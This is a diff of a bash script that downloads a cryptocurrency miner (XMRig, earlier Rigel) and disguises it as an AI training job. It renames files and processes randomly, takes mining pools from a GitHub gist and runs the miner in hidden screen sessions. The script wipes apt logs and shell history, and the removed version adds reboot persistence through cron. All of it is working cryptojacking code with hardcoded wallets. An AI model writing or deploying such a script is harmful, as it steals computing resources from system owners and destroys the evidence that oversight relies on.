@@ -1,141 +1,117 @@
 #!/bin/bash
 #
-# Adapted RigelMiner script with advanced stealth techniques from XMRig
-# (Instala e executa minerador CFX disfarçado como processo de treino de IA)
-# Inclui ocultação com nomes aleatórios, limpeza automática de TMP_DIR e monitoramento aprimorado.
+# Stealth-ish script to download, rename, and run XMRig as if it's
+# an LLM/training or CPU-intensive application. 
 #
+# (No guaranteed 100% stealth, but tries to reduce obvious traces.)
 
-############################################
-# 1) Verificação de privilégio root e criação do WORK_DIR
-############################################
+#############################
+# 1) Must be run as root
+#############################
 if [ "$(id -u)" -ne 0 ]; then
-    echo "Script precisa ser executado como root. Reexecutando com sudo..."
+    echo "This script requires root privileges. Re-running with sudo..."
     sudo bash "$0" "$@"
     exit
 fi
 
-# Diretório de trabalho permanente para armazenar o minerador e o script de monitor
-WORK_DIR="/root/llm"
-mkdir -p "$WORK_DIR"
+#############################
+# 2) Configuration
+#############################
+GIST_ID="9240922af4ba217c92d577e5a5d71eb7"
+WALLET="87J7ZFE5qToZNPBAwdSLpHGhfM7hbLnoMGTguotsrCvKVbGpeNeN25fHiDTrA3HWEv2yiAAwtn7WkJon4LrHpKgcFsXMtv8.A-1"
 
-############################################
-# 2) Configurações
-############################################
-GIST_ID="4339152fb1dfbb23e8d0c8d790895439"
-WALLET="cfx:aam7dxk8pab7djruc9w2dub0v1f19909m260h04tdd.A-1"
+# Packages needed
+NEEDED_PKGS="wget curl screen python3 python3-pip"
 
-# Pacotes necessários
-NEEDED_PKGS="curl wget tar screen python3 python3-pip"
+# XMRig repository
+REPO="xmrig/xmrig"
 
-# Repositório do Rigel Miner no GitHub
-REPO="rigelminer/rigel"
+#############################
+# 3) Helper Functions
+#############################
 
-############################################
-# 3) Funções auxiliares
-############################################
 random_name() {
-    # Gera um nome aleatório de 8 caracteres (a-z0-9)
-    tr -dc a-z0-9 < /dev/urandom | head -c 8
+  # Generate a random 8-character string of lowercase + digits
+  tr -dc a-z0-9 < /dev/urandom | head -c 8
 }
 
 clean_logs() {
-    # Remove logs do apt e histórico bash para reduzir rastros
-    rm -rf /var/log/apt/* 2>/dev/null
-    rm -f ~/.bash_history 2>/dev/null
-    history -c 2>/dev/null || true
+  # Remove apt logs and bash history (not a full guarantee)
+  rm -rf /var/log/apt/* 2>/dev/null
+  rm -f ~/.bash_history 2>/dev/null
+  history -c 2>/dev/null || true
 }
 
 install_if_missing() {
-    local PKG="$1"
-    if ! command -v "$PKG" &>/dev/null; then
-        apt-get update -y &>/dev/null
-        apt-get install -y "$PKG" &>/dev/null
-    fi
+  local PKG="$1"
+  if ! command -v "$PKG" &>/dev/null; then
+    apt-get update -y &>/dev/null
+    apt-get install -y "$PKG" &>/dev/null
+  fi
 }
 
-############################################
-# 4) Instalação de pacotes necessários
-############################################
+#############################
+# 4) Install required packages
+#############################
 for PKG in $NEEDED_PKGS; do
-    install_if_missing "$PKG"
+  install_if_missing "$PKG"
 done
 
-# Garante que a biblioteca Python "requests" esteja instalada
-pip3 install requests --upgrade &>/dev/null
+# Ensure "requests" library is installed for Python
+pip3 install requests &>/dev/null
 
-############################################
-# 5) Download e instalação do Rigel Miner (com nomes aleatórios)
-############################################
-echo "Baixando e instalando Rigel Miner com nomes aleatórios..."
-# Cria um diretório temporário para download e extração
+#############################
+# 5) Create a temp directory
+#############################
 TMP_DIR="$(mktemp -d -p /tmp)"
 cd "$TMP_DIR" || exit 1
 
-# Obtém a última versão via GitHub API e remove o prefixo 'v' (se houver)
-LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest | grep 'tag_name' | sed -E 's/.*"v?([^"]+)".*/\1/')"
+#############################
+# 6) Download & Extract XMRig
+#############################
+echo "[*] Downloading XMRig with random naming..."
+
+LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest \
+  | grep 'tag_name' \
+  | sed -E 's/.*\"v([^"]+)\".*/\1/')"
+
 if [ -z "$LATEST_VERSION" ]; then
-    echo "Erro: não foi possível obter a versão mais recente do Rigel Miner."
-    exit 1
-fi
-CLEAN_VERSION="$LATEST_VERSION"
-
-# Monta a URL de download utilizando a nomenclatura correta (tudo minúsculo, sem o prefixo "v")
-DOWNLOAD_URL="https://github.com/$REPO/releases/download/${CLEAN_VERSION}/rigel-${CLEAN_VERSION}-linux.tar.gz"
-echo "[*] Download URL: $DOWNLOAD_URL"
-
-wget -q "$DOWNLOAD_URL" -O rigel.tar.gz
-if [ ! -s rigel.tar.gz ]; then
-    echo "Erro: o arquivo baixado está vazio. Verifique a URL ou a disponibilidade do asset."
-    exit 1
+  echo "Could not fetch the latest XMRig version. Aborting."
+  exit 1
 fi
 
-tar -xzf rigel.tar.gz
-rm -f rigel.tar.gz
+XMRIG_URL="https://github.com/$REPO/releases/download/v$LATEST_VERSION/xmrig-$LATEST_VERSION-linux-static-x64.tar.gz"
+wget -q "$XMRIG_URL" -O trainer.tar.gz
+tar -xzf trainer.tar.gz
 
-# Procura pela pasta extraída – pode ser "Rigel-<versão>-linux" ou "rigel-<versão>-linux"
-if [ -d "Rigel-${CLEAN_VERSION}-linux" ]; then
-    ORIG_FOLDER="Rigel-${CLEAN_VERSION}-linux"
-elif [ -d "rigel-${CLEAN_VERSION}-linux" ]; then
-    ORIG_FOLDER="rigel-${CLEAN_VERSION}-linux"
-else
-    echo "Erro: pasta extraída do Rigel Miner não encontrada."
-    ls -l
-    exit 1
+# Original extracted folder
+ORIG_FOLDER="$(tar -tzf trainer.tar.gz | head -1 | cut -d/ -f1)"
+
+if [ ! -d "$ORIG_FOLDER" ]; then
+  echo "Error: extracted folder not found."
+  exit 1
 fi
 
-# Gera nomes aleatórios para pasta, binário e monitor
-NEW_FOLDER="module_$(random_name)"    # ex: module_x3f9a2b1
-NEW_BINARY="trainer_$(random_name)"     # ex: trainer_z8y6c4d0
-MONITOR_PY="monitor_$(random_name).py"    # ex: monitor_k9l1m2n3.py
-SCREEN_SESSION="sess_$(random_name)"      # sessão screen do monitor
-SCREEN_MINER="task_$(random_name)"        # sessão screen do minerador
+# Generate random folder & binary names
+NEW_FOLDER="model_$(random_name)"
+NEW_BINARY="train_$(random_name)"
+MONITOR_PY="analysis_$(random_name).py"
+SCREEN_SESSION="session_$(random_name)"
+SCREEN_MINER="worker_$(random_name)"
 
-# Mova a pasta extraída para o WORK_DIR para garantir sua persistência
-mv "$ORIG_FOLDER" "$WORK_DIR/$NEW_FOLDER"
-# Atualiza o caminho para o binário para apontar para WORK_DIR
-BINARY_PATH="$WORK_DIR/$NEW_FOLDER"
+mv "$ORIG_FOLDER" "$NEW_FOLDER"
+cd "$NEW_FOLDER" || exit 1
 
-cd "$BINARY_PATH" || exit 1
-
-# Renomeia o binário para o novo nome (verifica se é 'rigel' ou 'Rigel')
-if [ -f rigel ]; then
-    mv rigel "$NEW_BINARY"
-elif [ -f Rigel ]; then
-    mv Rigel "$NEW_BINARY"
-else
-    echo "Erro: binário 'rigel' ou 'Rigel' não encontrado."
-    ls -l
-    exit 1
-fi
+mv xmrig "$NEW_BINARY"
 chmod +x "$NEW_BINARY"
 
-echo "Minerador instalado na pasta '$NEW_FOLDER' e binário renomeado para '$NEW_BINARY'."
+echo "[*] Renamed folder to: $NEW_FOLDER"
+echo "[*] Renamed binary to: $NEW_BINARY"
 
-############################################
-# 6) Criação do script Python de monitoramento
-############################################
-cat > "$WORK_DIR/$MONITOR_PY" << EOPY
-import os
+#############################
+# 7) Create the Python Monitor
+#############################
+cat > "$MONITOR_PY" << EOL
 import json
 import socket
 import time
@@ -145,41 +121,38 @@ from typing import List, Optional
 
 GIST_ID = "${GIST_ID}"
 WALLET = "${WALLET}"
-BINARY_NAME = "${NEW_BINARY}"
-BINARY_PATH = "${BINARY_PATH}/${NEW_BINARY}"
-SCREEN_MINER = "${SCREEN_MINER}"
 
 class StratumManager:
     def __init__(self):
-        self.current_stratum: Optional[str] = None
-        self.stratum_list: List[str] = []
+        self.current_stratum = None
+        self.stratum_list = []
 
     def fetch_stratums_from_gist(self) -> List[str]:
         try:
-            url = f"https://api.github.com/gists/{GIST_ID}"
+            url = f'https://api.github.com/gists/{GIST_ID}'
             resp = requests.get(url, timeout=10)
             if resp.status_code == 200:
                 data = resp.json()
                 first_file = list(data['files'].values())[0]
-                stratums = json.loads(first_file['content'])
-                return stratums
+                content = first_file['content']
+                return json.loads(content)
             else:
-                print(f"[monitor] Erro ao acessar Gist: {resp.status_code}")
+                print("[analysis] Gist fetch error:", resp.status_code)
                 return []
         except Exception as e:
-            print(f"[monitor] Exceção ao obter stratums: {e}")
+            print("[analysis] Exception fetching gist:", e)
             return []
 
     def check_stratum(self, stratum: str) -> bool:
         try:
             host = stratum.split('://')[1].split(':')[0]
             port = int(stratum.split(':')[-1])
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            result = sock.connect_ex((host, port))
-            sock.close()
-            return result == 0
-        except Exception:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            r = s.connect_ex((host, port))
+            s.close()
+            return (r == 0)
+        except:
             return False
 
     def get_available_stratum(self) -> Optional[str]:
@@ -190,86 +163,60 @@ class StratumManager:
         return None
 
     def restart_miner(self, stratum: str):
-        subprocess.run(['pkill', '-f', BINARY_NAME], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[analysis] Stopping previous miner if any...")
+        subprocess.run(['pkill', '-f', '${NEW_BINARY}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
-        print(f"[monitor] Iniciando minerador no stratum: {stratum}")
-        cmd = f"screen -dmS {SCREEN_MINER} {BINARY_PATH} -a octopus -o {stratum} -u {WALLET} -p x"
+        print(f"[analysis] Starting miner on stratum: {stratum}")
+        # Adjust flags as needed. By default, no-limits:
+        cmd = f'screen -dmS ${SCREEN_MINER} ./${NEW_BINARY} -a randomx --url {stratum} --user {WALLET} --threads=64 --randomx-1gb-pages done'
         subprocess.run(cmd, shell=True)
+        print("[analysis] Miner started successfully!")
 
     def monitor_loop(self):
-        print("[monitor] Monitoramento de stratums iniciado. Aguardando conexões...")
+        print("[analysis] Stratum monitor started. Looping...")
         while True:
             if not self.current_stratum:
                 stratum = self.get_available_stratum()
                 if stratum:
                     self.current_stratum = stratum
-                    print(f"[monitor] Stratum inicial selecionado: {stratum}")
                     self.restart_miner(stratum)
                 else:
-                    print("[monitor] Nenhum stratum disponível no momento.")
+                    print("[analysis] No available stratum found.")
             else:
                 if not self.check_stratum(self.current_stratum):
-                    print(f"[monitor] Stratum {self.current_stratum} indisponível. Buscando outro...")
-                    new_stratum = self.get_available_stratum()
-                    if new_stratum and new_stratum != self.current_stratum:
-                        print(f"[monitor] Trocando para novo stratum: {new_stratum}")
-                        self.current_stratum = new_stratum
-                        self.restart_miner(new_stratum)
-                    else:
-                        print("[monitor] Nenhum stratum alternativo encontrado.")
-            print("Aguardando 5 minutos até próxima verificação...")
+                    new_s = self.get_available_stratum()
+                    if new_s and new_s != self.current_stratum:
+                        self.current_stratum = new_s
+                        self.restart_miner(new_s)
             time.sleep(300)
 
 if __name__ == "__main__":
     manager = StratumManager()
-    try:
-        manager.monitor_loop()
-    except Exception as e:
-        print(f"[monitor] Erro fatal no monitor: {e}")
-EOPY
+    manager.monitor_loop()
+EOL
 
-chmod +x "$WORK_DIR/$MONITOR_PY"
+chmod +x "$MONITOR_PY"
 
-############################################
-# 7) Inicialização do monitor em background (screen)
-############################################
+#############################
+# 8) Start the Monitor in Screen
+#############################
 pkill -f "$MONITOR_PY" 2>/dev/null || true
-screen -dmS "$SCREEN_SESSION" python3 "$WORK_DIR/$MONITOR_PY"
-echo "Monitor Python iniciado na sessão screen '$SCREEN_SESSION'."
+screen -dmS "$SCREEN_SESSION" python3 "$MONITOR_PY"
+echo "[*] Python monitor started in screen session: $SCREEN_SESSION"
 
-############################################
-# 8) Limpeza e remoção do diretório temporário de download
-############################################
-echo "Agendando limpeza do diretório temporário de download em 30s..."
-screen -dmS remove_tmp bash -c "sleep 30; rm -rf '$TMP_DIR'; echo 'Diretório temporário removido.'"
+#############################
+# 9) Cleanup
+#############################
+rm -f ../trainer.tar.gz 2>/dev/null
 clean_logs
 
-############################################
-# 9) Informações de execução
-############################################
-echo "Configuração completa!"
-echo "- Script de monitoramento: $MONITOR_PY (sessão '$SCREEN_SESSION')"
-echo "- Processo de mineração: $NEW_BINARY (sessão '$SCREEN_MINER')"
-echo "Para verificar o monitor: screen -r $SCREEN_SESSION"
-echo "Para verificar o minerador: screen -r $SCREEN_MINER"
-echo "(Use Ctrl+A, D para sair da tela sem encerrar os processos)"
+#############################
+# 10) (Optional) Remove this script
+#############################
+# rm -- "$0"
 
-############################################
-# 10) Configuração de execução automática no reboot
-############################################
-CRON_LINE="@reboot /root/llm/miner.sh"
-CRONTAB_TMP="/tmp/cron.tmp"
-
-crontab -l 2>/dev/null > "$CRONTAB_TMP" || true
-if ! grep -qF "$CRON_LINE" "$CRONTAB_TMP"; then
-    echo "" >> "$CRONTAB_TMP"
-    echo "# Iniciar miner automaticamente no reboot" >> "$CRONTAB_TMP"
-    echo "$CRON_LINE" >> "$CRONTAB_TMP"
-    crontab "$CRONTAB_TMP"
-    echo "Linha '@reboot' adicionada ao crontab com sucesso!"
-else
-    echo "Entrada '@reboot' já existe no crontab. Nenhuma alteração necessária."
-fi
-rm -f "$CRONTAB_TMP"
-
-echo "Script finalizado!"
+echo "[*] Done. The miner is running in a disguised form."
+echo "[*] Folder: $NEW_FOLDER, binary: $NEW_BINARY, monitor: $MONITOR_PY"
+echo "[*] Screen sessions: $SCREEN_SESSION (monitor) -> $SCREEN_MINER (miner)."
+echo "[*] Attach to monitor with: screen -r $SCREEN_SESSION"
+echo "[*] To detach: Ctrl+A, then D."
